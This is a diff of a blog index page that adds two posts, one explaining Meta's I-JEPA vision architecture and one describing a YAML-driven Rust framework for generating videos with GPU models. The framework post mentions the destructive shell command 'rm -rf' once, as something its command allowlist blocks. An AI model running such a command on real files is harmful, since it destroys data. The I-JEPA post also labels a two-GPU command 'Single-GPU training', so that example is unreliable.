@@ -10,16 +10,16 @@
 <meta property="og:locale" content="en_US" />
 <meta name="description" content="AI coding agents, systems programming, and practical machine learning" />
 <meta property="og:description" content="AI coding agents, systems programming, and practical machine learning" />
-<link rel="canonical" href="https://software-wrighter-lab.github.io/" />
-<meta property="og:url" content="https://software-wrighter-lab.github.io/" />
+<link rel="canonical" href="http://localhost:5907/" />
+<meta property="og:url" content="http://localhost:5907/" />
 <meta property="og:site_name" content="Software Wrighter Lab Blog" />
 <meta property="og:type" content="website" />
 <meta name="twitter:card" content="summary" />
 <meta property="twitter:title" content="Software Wrighter Lab Blog" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"WebSite","author":{"@type":"Person","name":"Mike Wright"},"description":"AI coding agents, systems programming, and practical machine learning","headline":"Software Wrighter Lab Blog","name":"Software Wrighter Lab Blog","url":"https://software-wrighter-lab.github.io/"}</script>
+{"@context":"https://schema.org","@type":"WebSite","author":{"@type":"Person","name":"Mike Wright"},"description":"AI coding agents, systems programming, and practical machine learning","headline":"Software Wrighter Lab Blog","name":"Software Wrighter Lab Blog","url":"http://localhost:5907/"}</script>
 <!-- End Jekyll SEO tag -->
-<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://software-wrighter-lab.github.io/feed.xml" title="Software Wrighter Lab Blog" /><!-- Theme toggle script - load early to prevent flash -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:5907/feed.xml" title="Software Wrighter Lab Blog" /><!-- Theme toggle script - load early to prevent flash -->
   <script>
     (function() {
       var stored = localStorage.getItem('sw-lab-theme');
@@ -242,7 +242,2965 @@
       <div class="page-info" id="page-info-top"></div>
     </div>
 
-    <ul class="post-list" id="post-list"><li class="post-item" data-index="0"><p class="post-meta">February 22, 2026 &bull; Software Wrighter</p>
+    <ul class="post-list" id="post-list"><li class="post-item" data-index="0"><p class="post-meta">January 4, 2027 &bull; Software Wrighter</p>
+<p class="post-reading-info"><em><span class="post-word-count">749 words</span> &bull; <span class="post-read-time">4 min read</span></em></p><h3>
+          <a class="post-link" href="/2027/01/04/i-jepa-world-model-vision/">
+            I-JEPA: Yann LeCun&#39;s Vision for World Models
+          </a>
+        </h3><nav class="toc" data-toc-id="i-jepa-world-model-vision">
+  <h4>Contents</h4>
+  <ul class="toc-list"></ul>
+</nav>
+
+<style>
+/* Post content flows around floated TOC */
+.post-content {
+  overflow: hidden;
+}
+
+.toc {
+  background: #fffde7;
+  border-radius: 8px;
+  padding: 1rem 1.5rem;
+  margin: 0 1.5rem 1rem 0;
+  float: left;
+  max-width: 280px;
+}
+
+[data-theme="dark"] .toc {
+  background: #3d3a00;
+}
+
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) .toc {
+    background: #3d3a00;
+  }
+}
+
+.toc h4 {
+  margin: 0 0 0.75rem 0;
+  font-size: 1rem;
+}
+
+.toc ul {
+  margin: 0;
+  padding-left: 1.25rem;
+  list-style-type: disc;
+}
+
+.toc li {
+  margin: 0.25rem 0;
+}
+
+.toc li.toc-h3 {
+  margin-left: 1rem;
+  font-size: 0.95em;
+}
+
+.toc a {
+  text-decoration: none;
+}
+
+.toc a:hover {
+  text-decoration: underline;
+}
+
+
+@media (max-width: 600px) {
+  .toc {
+    float: none;
+    max-width: 100%;
+    margin: 0 0 1.5rem 0;
+  }
+}
+
+/* References section that floats alongside TOC */
+.references-float {
+  overflow: hidden; /* contain floated content */
+}
+
+.references-float h2 {
+  margin-top: 0;
+  font-size: 1.25rem;
+}
+
+.references-float table {
+  font-size: 0.9em;
+  width: 100%;
+}
+
+.references-float td, .references-float th {
+  padding: 0.4rem 0.6rem;
+  vertical-align: top;
+}
+
+.references-float td:first-child {
+  white-space: nowrap;
+  font-weight: bold;
+  width: 1%;
+}
+
+@media (max-width: 600px) {
+  .references-float table {
+    font-size: 0.85em;
+  }
+}
+</style>
+
+<script>
+(function() {
+  // Run after DOM is ready
+  function initTOC() {
+    document.querySelectorAll('.toc').forEach(function(toc) {
+      if (toc.dataset.initialized) return;
+      toc.dataset.initialized = 'true';
+
+      const tocList = toc.querySelector('.toc-list');
+      if (!tocList) return;
+
+      // Find the associated post-content (next sibling or parent's post-content)
+      let article = toc.nextElementSibling;
+      while (article && !article.classList.contains('post-content')) {
+        article = article.nextElementSibling;
+      }
+      // Fallback: look for .post-content in the document (single post page)
+      if (!article) {
+        article = document.querySelector('.post-content');
+      }
+
+      if (!article) {
+        toc.style.display = 'none';
+        return;
+      }
+
+      const headings = article.querySelectorAll('h2, h3');
+
+      if (headings.length < 3) {
+        toc.style.display = 'none';
+        return;
+      }
+
+      const tocId = toc.dataset.tocId || Math.random().toString(36).substr(2, 9);
+
+      headings.forEach(function(heading, index) {
+        // Add unique ID if missing
+        if (!heading.id) {
+          heading.id = 'toc-' + tocId + '-heading-' + index;
+        }
+
+        const li = document.createElement('li');
+        li.className = 'toc-' + heading.tagName.toLowerCase();
+
+        const a = document.createElement('a');
+        a.href = '#' + heading.id;
+        a.textContent = heading.textContent;
+
+        li.appendChild(a);
+        tocList.appendChild(li);
+      });
+    });
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initTOC);
+  } else {
+    initTOC();
+  }
+})();
+</script>
+<div class="post-content">
+          <p><img src="/assets/images/posts/hummingbird-flower.png" class="post-marker" alt="" /></p>
+
+<p>Predict representations, not pixels. That’s the key insight.</p>
+
+<p><strong>I-JEPA</strong> (Image-based Joint-Embedding Predictive Architecture) is Yann LeCun’s first step toward human-like AI—machines that build internal models of how the world works.</p>
+
+<div class="resource-box">
+
+  <table>
+    <thead>
+      <tr>
+        <th>Resource</th>
+        <th>Link</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Paper</strong></td>
+        <td><a href="https://arxiv.org/abs/2301.08243">Self-Supervised Learning from Images (arXiv)</a></td>
+      </tr>
+      <tr>
+        <td><strong>Code</strong></td>
+        <td><a href="https://github.com/facebookresearch/ijepa">facebookresearch/ijepa</a></td>
+      </tr>
+      <tr>
+        <td><strong>Blog</strong></td>
+        <td><a href="https://ai.meta.com/blog/yann-lecun-ai-model-i-jepa/">Meta AI Blog</a></td>
+      </tr>
+      <tr>
+        <td><strong>Video</strong></td>
+        <td>Coming soon</td>
+      </tr>
+    </tbody>
+  </table>
+
+</div>
+
+<h2 id="the-vision-world-models">The Vision: World Models</h2>
+
+<p>Yann LeCun’s goal: machines that develop internal models of how the world operates. This enables:</p>
+
+<ul>
+  <li>Faster learning with less data</li>
+  <li>Complex task planning</li>
+  <li>Adaptation to unfamiliar situations</li>
+</ul>
+
+<p>Current AI learns patterns. World models learn <em>understanding</em>.</p>
+
+<h2 id="the-problem-with-current-approaches">The Problem with Current Approaches</h2>
+
+<h3 id="generative-models-mae-bert">Generative Models (MAE, BERT)</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Input: [Image with mask]
+Output: Reconstructed pixels
+</code></pre></div></div>
+
+<p>Problem: Predicting every pixel wastes capacity on unpredictable details. Extra fingers on hands. Wrong textures. Noise.</p>
+
+<h3 id="invariance-based-models-clip-simclr">Invariance-Based Models (CLIP, SimCLR)</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Input: [Multiple augmented views]
+Output: Same representation for all views
+</code></pre></div></div>
+
+<p>Problem: Hand-crafted augmentations bake in biases. The model learns the augmentations, not the world.</p>
+
+<h2 id="i-jepa-predict-representations">I-JEPA: Predict Representations</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Input: [Context blocks from image]
+Output: Representations of masked target blocks
+</code></pre></div></div>
+
+<p>I-JEPA predicts in <strong>abstract representation space</strong>, not pixel space. It learns what matters, ignoring what doesn’t.</p>
+
+<h2 id="architecture">Architecture</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─────────────────────────────────────┐
+│         Target Encoder              │  Full image → target representations
+│         (ViT, EMA updated)          │
+└─────────────────────────────────────┘
+                 ↓
+┌─────────────────────────────────────┐
+│           Predictor                 │  Context + mask → predicted targets
+└─────────────────────────────────────┘
+                 ↑
+┌─────────────────────────────────────┐
+│        Context Encoder              │  Visible patches → context
+│         (ViT, trained)              │
+└─────────────────────────────────────┘
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>Component</th>
+      <th>Role</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Context Encoder</strong></td>
+      <td>ViT processing visible image patches</td>
+    </tr>
+    <tr>
+      <td><strong>Target Encoder</strong></td>
+      <td>ViT processing full image (EMA updated)</td>
+    </tr>
+    <tr>
+      <td><strong>Predictor</strong></td>
+      <td>Forecasts target representations from context</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="multi-block-masking">Multi-Block Masking</h3>
+
+<p>The key innovation: predict <strong>large semantic blocks</strong> using spatially distributed context.</p>
+
+<p>This forces the model to capture high-level information—object structure, scene layout, semantic content—not pixel details.</p>
+
+<h2 id="results">Results</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Metric</th>
+      <th>I-JEPA</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Training</strong></td>
+      <td>632M params, 16 A100s, &lt;72 hours</td>
+    </tr>
+    <tr>
+      <td><strong>Efficiency</strong></td>
+      <td>2-10x fewer GPU-hours than alternatives</td>
+    </tr>
+    <tr>
+      <td><strong>Low-shot</strong></td>
+      <td>SOTA with 12 labeled examples/class</td>
+    </tr>
+    <tr>
+      <td><strong>Linear probe</strong></td>
+      <td>Outperforms pixel reconstruction</td>
+    </tr>
+    <tr>
+      <td><strong>Depth/counting</strong></td>
+      <td>Superior on low-level vision</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="comparison">Comparison</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Approach</th>
+      <th>Predicts</th>
+      <th>Problem</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>MAE</td>
+      <td>Pixels</td>
+      <td>Wastes capacity on noise</td>
+    </tr>
+    <tr>
+      <td>SimCLR</td>
+      <td>Invariances</td>
+      <td>Limited by augmentations</td>
+    </tr>
+    <tr>
+      <td><strong>I-JEPA</strong></td>
+      <td><strong>Representations</strong></td>
+      <td>Learns semantics</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="pretrained-models">Pretrained Models</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Architecture</th>
+      <th>Resolution</th>
+      <th>Dataset</th>
+      <th>Epochs</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>ViT-H/14</td>
+      <td>224×224</td>
+      <td>ImageNet-1K</td>
+      <td>300</td>
+    </tr>
+    <tr>
+      <td>ViT-H/16</td>
+      <td>448×448</td>
+      <td>ImageNet-1K</td>
+      <td>300</td>
+    </tr>
+    <tr>
+      <td>ViT-H/14</td>
+      <td>224×224</td>
+      <td>ImageNet-22K</td>
+      <td>66</td>
+    </tr>
+    <tr>
+      <td>ViT-g/16</td>
+      <td>224×224</td>
+      <td>ImageNet-22K</td>
+      <td>44</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="running-i-jepa">Running I-JEPA</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/facebookresearch/ijepa
+<span class="nb">cd </span>ijepa
+
+<span class="c"># Install dependencies</span>
+pip <span class="nb">install </span>torch torchvision pyyaml numpy opencv-python
+
+<span class="c"># Single-GPU training</span>
+python main.py <span class="se">\</span>
+  <span class="nt">--fname</span> configs/in1k_vith14_ep300.yaml <span class="se">\</span>
+  <span class="nt">--devices</span> cuda:0 cuda:1
+
+<span class="c"># Multi-GPU (SLURM)</span>
+python main_distributed.py <span class="se">\</span>
+  <span class="nt">--fname</span> configs/in1k_vith14_ep300.yaml <span class="se">\</span>
+  <span class="nt">--nodes</span> 2 <span class="nt">--tasks-per-node</span> 8
+</code></pre></div></div>
+
+<h2 id="the-jepa-family">The JEPA Family</h2>
+
+<p>I-JEPA spawned a family of architectures:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Model</th>
+      <th>Modality</th>
+      <th>Innovation</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>I-JEPA</strong></td>
+      <td>Images</td>
+      <td>Original architecture</td>
+    </tr>
+    <tr>
+      <td><strong>V-JEPA</strong></td>
+      <td>Video</td>
+      <td>Temporal prediction</td>
+    </tr>
+    <tr>
+      <td><strong>VL-JEPA</strong></td>
+      <td>Vision-Language</td>
+      <td>Text embedding prediction</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="v-jepa-video">V-JEPA (Video)</h3>
+
+<p>Trained on 2M public videos. No pretrained encoders, no text supervision. Strong motion and appearance understanding.</p>
+
+<h3 id="vl-jepa-vision-language">VL-JEPA (Vision-Language)</h3>
+
+<p>Predicts continuous text embeddings instead of tokens. 50% fewer parameters than standard VLMs. Outperforms CLIP, SigLIP2 on video tasks.</p>
+
+<h2 id="why-this-matters">Why This Matters</h2>
+
+<ol>
+  <li>
+    <p><strong>World models &gt; pattern matching.</strong> Understanding beats memorization.</p>
+  </li>
+  <li>
+    <p><strong>Representations &gt; pixels.</strong> Abstract prediction is more efficient.</p>
+  </li>
+  <li>
+    <p><strong>No augmentation bias.</strong> Learn from data, not hand-crafted transforms.</p>
+  </li>
+  <li>
+    <p><strong>Efficiency wins.</strong> 10x less compute for better results.</p>
+  </li>
+</ol>
+
+<h2 id="key-takeaways">Key Takeaways</h2>
+
+<ol>
+  <li>
+    <p><strong>Predict representations, not pixels.</strong> Abstract space captures semantics, ignores noise.</p>
+  </li>
+  <li>
+    <p><strong>Multi-block masking forces understanding.</strong> Large semantic predictions require real comprehension.</p>
+  </li>
+  <li>
+    <p><strong>World models are the future.</strong> LeCun’s vision points toward truly intelligent systems.</p>
+  </li>
+  <li>
+    <p><strong>The JEPA family is growing.</strong> Images → Video → Vision-Language → ???</p>
+  </li>
+</ol>
+
+<h2 id="resources">Resources</h2>
+
+<ul>
+  <li><a href="https://arxiv.org/abs/2301.08243">I-JEPA Paper (arXiv:2301.08243)</a></li>
+  <li><a href="https://github.com/facebookresearch/ijepa">GitHub Repository</a></li>
+  <li><a href="https://ai.meta.com/blog/yann-lecun-ai-model-i-jepa/">Meta AI Blog Post</a></li>
+  <li><a href="https://www.marktechpost.com/2025/02/22/meta-ai-releases-the-video-joint-embedding-predictive-architecture-v-jepa-model/">V-JEPA Announcement</a></li>
+  <li><a href="https://arxiv.org/abs/2512.10942">VL-JEPA Paper</a></li>
+</ul>
+
+<hr />
+
+<p><em>Predict the representation, not the pixels. That’s how you build a world model.</em></p>
+
+          </div>
+
+
+
+
+
+<img src="/assets/images/site/post-separator.png" class="post-separator" alt="">
+      </li><li class="post-item" data-index="1"><p class="post-meta">January 3, 2027 &bull; Software Wrighter</p>
+<p class="post-reading-info"><em><span class="post-word-count">1506 words</span> &bull; <span class="post-read-time">8 min read</span></em></p><h3>
+          <a class="post-link" href="/2027/01/03/sharpen-the-saw-video-workflow-rs/">
+            Sharpen the Saw: Video Workflow Framework
+          </a>
+        </h3><nav class="toc" data-toc-id="sharpen-the-saw-video-workflow-rs">
+  <h4>Contents</h4>
+  <ul class="toc-list"></ul>
+</nav>
+
+<style>
+/* Post content flows around floated TOC */
+.post-content {
+  overflow: hidden;
+}
+
+.toc {
+  background: #fffde7;
+  border-radius: 8px;
+  padding: 1rem 1.5rem;
+  margin: 0 1.5rem 1rem 0;
+  float: left;
+  max-width: 280px;
+}
+
+[data-theme="dark"] .toc {
+  background: #3d3a00;
+}
+
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) .toc {
+    background: #3d3a00;
+  }
+}
+
+.toc h4 {
+  margin: 0 0 0.75rem 0;
+  font-size: 1rem;
+}
+
+.toc ul {
+  margin: 0;
+  padding-left: 1.25rem;
+  list-style-type: disc;
+}
+
+.toc li {
+  margin: 0.25rem 0;
+}
+
+.toc li.toc-h3 {
+  margin-left: 1rem;
+  font-size: 0.95em;
+}
+
+.toc a {
+  text-decoration: none;
+}
+
+.toc a:hover {
+  text-decoration: underline;
+}
+
+
+@media (max-width: 600px) {
+  .toc {
+    float: none;
+    max-width: 100%;
+    margin: 0 0 1.5rem 0;
+  }
+}
+
+/* References section that floats alongside TOC */
+.references-float {
+  overflow: hidden; /* contain floated content */
+}
+
+.references-float h2 {
+  margin-top: 0;
+  font-size: 1.25rem;
+}
+
+.references-float table {
+  font-size: 0.9em;
+  width: 100%;
+}
+
+.references-float td, .references-float th {
+  padding: 0.4rem 0.6rem;
+  vertical-align: top;
+}
+
+.references-float td:first-child {
+  white-space: nowrap;
+  font-weight: bold;
+  width: 1%;
+}
+
+@media (max-width: 600px) {
+  .references-float table {
+    font-size: 0.85em;
+  }
+}
+</style>
+
+<script>
+(function() {
+  // Run after DOM is ready
+  function initTOC() {
+    document.querySelectorAll('.toc').forEach(function(toc) {
+      if (toc.dataset.initialized) return;
+      toc.dataset.initialized = 'true';
+
+      const tocList = toc.querySelector('.toc-list');
+      if (!tocList) return;
+
+      // Find the associated post-content (next sibling or parent's post-content)
+      let article = toc.nextElementSibling;
+      while (article && !article.classList.contains('post-content')) {
+        article = article.nextElementSibling;
+      }
+      // Fallback: look for .post-content in the document (single post page)
+      if (!article) {
+        article = document.querySelector('.post-content');
+      }
+
+      if (!article) {
+        toc.style.display = 'none';
+        return;
+      }
+
+      const headings = article.querySelectorAll('h2, h3');
+
+      if (headings.length < 3) {
+        toc.style.display = 'none';
+        return;
+      }
+
+      const tocId = toc.dataset.tocId || Math.random().toString(36).substr(2, 9);
+
+      headings.forEach(function(heading, index) {
+        // Add unique ID if missing
+        if (!heading.id) {
+          heading.id = 'toc-' + tocId + '-heading-' + index;
+        }
+
+        const li = document.createElement('li');
+        li.className = 'toc-' + heading.tagName.toLowerCase();
+
+        const a = document.createElement('a');
+        a.href = '#' + heading.id;
+        a.textContent = heading.textContent;
+
+        li.appendChild(a);
+        tocList.appendChild(li);
+      });
+    });
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initTOC);
+  } else {
+    initTOC();
+  }
+})();
+</script>
+<div class="post-content">
+          <p><img src="/assets/images/posts/block-framework.png" class="post-marker" alt="" /></p>
+
+<p>Every Sunday I try to sharpen my tools—fix recurring friction, automate repetitive tasks, make future work go more smoothly. This week: a workflow framework that orchestrates a full media generation pipeline—text-to-image, TTS voice cloning, image-to-video, text-to-video, and procedural music—all from YAML definitions.</p>
+
+<div class="resource-box">
+
+  <table>
+    <thead>
+      <tr>
+        <th>Resource</th>
+        <th>Link</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Repo</strong></td>
+        <td><a href="https://github.com/softwarewrighter/video_workflow_rs">video_workflow_rs</a></td>
+      </tr>
+      <tr>
+        <td><strong>Short</strong></td>
+        <td>Coming soon</td>
+      </tr>
+      <tr>
+        <td><strong>Explainer</strong></td>
+        <td>Coming soon</td>
+      </tr>
+    </tbody>
+  </table>
+
+</div>
+
+<h2 id="the-problem">The Problem</h2>
+
+<p>I produce two kinds of videos regularly:</p>
+<ul>
+  <li><strong>Shorts</strong>: Portrait mode (1080x1920), under 3 minutes</li>
+  <li><strong>Explainers</strong>: Landscape mode (1920x1080), 1-30 minutes</li>
+</ul>
+
+<p>Both share many steps: title stills, OBS clips, narration generation, intro/outro segments, background music, “like &amp; subscribe” overlays. The process is complex enough that <strong>AI agents routinely drift</strong>:</p>
+
+<ul>
+  <li>Forget steps documented minutes ago</li>
+  <li>Hallucinate parameters</li>
+  <li>Make the same mistakes repeatedly</li>
+  <li>Guess when they should ask</li>
+</ul>
+
+<p>Even with detailed documentation describing common errors and how to avoid them, the agents fail. The context window is too large, the instructions too diffuse, the tooling too permissive.</p>
+
+<h2 id="the-solution-workflows-as-data">The Solution: Workflows as Data</h2>
+
+<p><strong>video-workflow-rs</strong> inverts control. Instead of giving an agent free rein with vague instructions, the framework:</p>
+
+<ol>
+  <li><strong>Defines workflows as YAML</strong>—not remembered instructions</li>
+  <li><strong>Uses DAG-based scheduling</strong>—explicit task dependencies, not sequential guessing</li>
+  <li><strong>Tracks artifacts</strong>—outputs become inputs for downstream tasks</li>
+  <li><strong>Supports resume</strong>—skip completed steps on re-run</li>
+  <li><strong>Integrates GPU services</strong>—TTS, text-to-image, image-to-video, text-to-video</li>
+  <li><strong>Captures everything</strong> in a manifest for provenance and debugging</li>
+</ol>
+
+<h2 id="quick-start">Quick Start</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Generate a YouTube Short (vertical 1080x1920, ~30 sec)</span>
+./scripts/demo-short.sh
+
+<span class="c"># Generate an explainer video (landscape 1920x1080, ~32 sec)</span>
+./scripts/demo-explainer.sh
+</code></pre></div></div>
+
+<p>Each script runs a complete pipeline: script generation, TTS voice cloning, video assembly.</p>
+
+<h2 id="gpu-services">GPU Services</h2>
+
+<p>The framework integrates with multiple GPU services running via ComfyUI and Gradio. All services share a single NVIDIA RTX 5060 Ti 16GB—run one at a time to avoid OOM.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Service</th>
+      <th>Port</th>
+      <th>Model</th>
+      <th>Use Case</th>
+      <th>Time</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>FLUX</strong></td>
+      <td>8570</td>
+      <td>flux1-schnell-fp8</td>
+      <td>Text → Image</td>
+      <td>~12s</td>
+    </tr>
+    <tr>
+      <td><strong>SVD</strong></td>
+      <td>8100</td>
+      <td>svd_xt</td>
+      <td>Image → Video</td>
+      <td>~70s (14 frames)</td>
+    </tr>
+    <tr>
+      <td><strong>Wan 2.2</strong></td>
+      <td>6000</td>
+      <td>wan2.2_ti2v_5B</td>
+      <td>Text → Video</td>
+      <td>~13min (81 frames)</td>
+    </tr>
+    <tr>
+      <td><strong>VoxCPM</strong></td>
+      <td>7860</td>
+      <td>Voice cloning</td>
+      <td>Text → Speech</td>
+      <td>~5s</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="text-to-image-flux">Text-to-Image (FLUX)</h3>
+
+<p>Generate images directly from prompts via the <code class="language-plaintext highlighter-rouge">text_to_image</code> workflow step:</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="pi">-</span> <span class="na">id</span><span class="pi">:</span> <span class="s">gen_background</span>
+  <span class="na">kind</span><span class="pi">:</span> <span class="s">text_to_image</span>
+  <span class="na">prompt</span><span class="pi">:</span> <span class="s2">"</span><span class="s">A</span><span class="nv"> </span><span class="s">futuristic</span><span class="nv"> </span><span class="s">coding</span><span class="nv"> </span><span class="s">workspace,</span><span class="nv"> </span><span class="s">dark</span><span class="nv"> </span><span class="s">theme,</span><span class="nv"> </span><span class="s">neon</span><span class="nv"> </span><span class="s">accents"</span>
+  <span class="na">output_path</span><span class="pi">:</span> <span class="s2">"</span><span class="s">work/images/background.png"</span>
+  <span class="na">orientation</span><span class="pi">:</span> <span class="s2">"</span><span class="s">landscape"</span>
+</code></pre></div></div>
+
+<p>Or use the client script directly:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python scripts/flux_client.py <span class="nt">-p</span> <span class="s2">"prompt"</span> <span class="nt">-o</span> image.png <span class="nt">--orientation</span> portrait
+</code></pre></div></div>
+
+<h3 id="image-to-video-svd">Image-to-Video (SVD)</h3>
+
+<p>Animate still images using Stable Video Diffusion. Best for natural/organic motion—water, fire, clouds, foliage.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python scripts/svd_client.py <span class="nt">-i</span> image.jpg <span class="nt">-o</span> video.mp4 <span class="nt">--motion</span> 100 <span class="nt">--frames</span> 30
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>Works Well</th>
+      <th>Avoid</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Water, waves, ripples</td>
+      <td>Forward camera travel</td>
+    </tr>
+    <tr>
+      <td>Fire, smoke, candles</td>
+      <td>Architectural scenes</td>
+    </tr>
+    <tr>
+      <td>Foliage, grass, wind</td>
+      <td>Complex object physics</td>
+    </tr>
+    <tr>
+      <td>Clouds, sky, aurora</td>
+      <td>Action sequences</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="text-to-video-wan-22">Text-to-Video (Wan 2.2)</h3>
+
+<p>Generate video directly from text prompts—no input image required:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python scripts/wan22_client.py <span class="nt">-p</span> <span class="s2">"A serene forest at sunrise"</span> <span class="nt">-o</span> video.mp4 <span class="nt">--length</span> 81
+</code></pre></div></div>
+
+<p>Output is 2x the latent resolution (landscape: 1664x960, portrait: 960x1664). Generation takes ~13 minutes for 5 seconds of video.</p>
+
+<h3 id="tts-voice-cloning-voxcpm">TTS Voice Cloning (VoxCPM)</h3>
+
+<p>Clone a voice from a reference sample using the <code class="language-plaintext highlighter-rouge">tts_generate</code> workflow step:</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="pi">-</span> <span class="na">id</span><span class="pi">:</span> <span class="s">tts_narration</span>
+  <span class="na">kind</span><span class="pi">:</span> <span class="s">tts_generate</span>
+  <span class="na">script_path</span><span class="pi">:</span> <span class="s">work/scripts/narration.txt</span>
+  <span class="na">output_path</span><span class="pi">:</span> <span class="s">work/audio/narration.wav</span>
+  <span class="na">reference_audio</span><span class="pi">:</span> <span class="s">/path/to/reference.wav</span>
+  <span class="na">reference_text</span><span class="pi">:</span> <span class="s2">"</span><span class="s">Transcript</span><span class="nv"> </span><span class="s">of</span><span class="nv"> </span><span class="s">reference</span><span class="nv"> </span><span class="s">audio..."</span>
+</code></pre></div></div>
+
+<h3 id="music-generation-midi-cli-rs">Music Generation (midi-cli-rs)</h3>
+
+<p>Generate incidental music for intros/outros with procedural MIDI synthesis:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>midi-cli-rs preset <span class="nt">--mood</span> upbeat <span class="nt">--duration</span> 5 <span class="nt">-o</span> intro.wav
+midi-cli-rs preset <span class="nt">--mood</span> calm <span class="nt">--duration</span> 5 <span class="nt">-o</span> outro.wav
+midi-cli-rs preset <span class="nt">--mood</span> suspense <span class="nt">--duration</span> 5 <span class="nt">-o</span> dramatic.wav
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>Mood</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>upbeat</td>
+      <td>Energetic, rhythmic patterns</td>
+    </tr>
+    <tr>
+      <td>calm</td>
+      <td>Peaceful, sustained pads</td>
+    </tr>
+    <tr>
+      <td>suspense</td>
+      <td>Tense, low drones</td>
+    </tr>
+    <tr>
+      <td>ambient</td>
+      <td>Atmospheric, pentatonic</td>
+    </tr>
+    <tr>
+      <td>eerie</td>
+      <td>Creepy, sparse tones</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="workflow-step-types">Workflow Step Types</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Step</th>
+      <th>Purpose</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">ensure_dirs</code></td>
+      <td>Create directories relative to workdir</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">write_file</code></td>
+      <td>Render template and write text</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">llm_generate</code></td>
+      <td>Call LLM with template, write output</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">split_sections</code></td>
+      <td>Extract sections from generated text</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">run_command</code></td>
+      <td>Execute shell command (allowlisted)</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">tts_generate</code></td>
+      <td>Voice clone via VoxCPM</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">text_to_image</code></td>
+      <td>Generate image via FLUX</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Commands are guarded by an allowlist—no accidental <code class="language-plaintext highlighter-rouge">rm -rf</code> disasters.</p>
+
+<h2 id="architecture-three-components">Architecture: Three Components</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>video_workflow_rs/
+├── components/
+│   ├── vwf-foundation/   # Layer 0: Types, Runtime, DAG, Queue
+│   ├── vwf-engine/       # Layer 1-4: Config, Render, Steps, Core
+│   └── vwf-apps/         # Layer 5: CLI, Web UI
+├── test-projects/
+│   ├── sample-short/     # YouTube Short demo
+│   └── sample-video/     # Explainer demo
+└── scripts/
+    ├── flux_client.py    # Text-to-image
+    ├── svd_client.py     # Image-to-video
+    └── wan22_client.py   # Text-to-video
+</code></pre></div></div>
+
+<h3 id="dependency-hierarchy-no-cycles">Dependency Hierarchy (No Cycles)</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Layer 0: vwf-types (external crates only)
+         ↓
+Layer 1: vwf-runtime, vwf-dag, vwf-queue
+         ↓
+Layer 2: vwf-config, vwf-render
+         ↓
+Layer 3: vwf-steps
+         ↓
+Layer 4: vwf-core
+         ↓
+Layer 5: vwf-cli, vwf-web
+</code></pre></div></div>
+
+<h2 id="resume-support">Resume Support</h2>
+
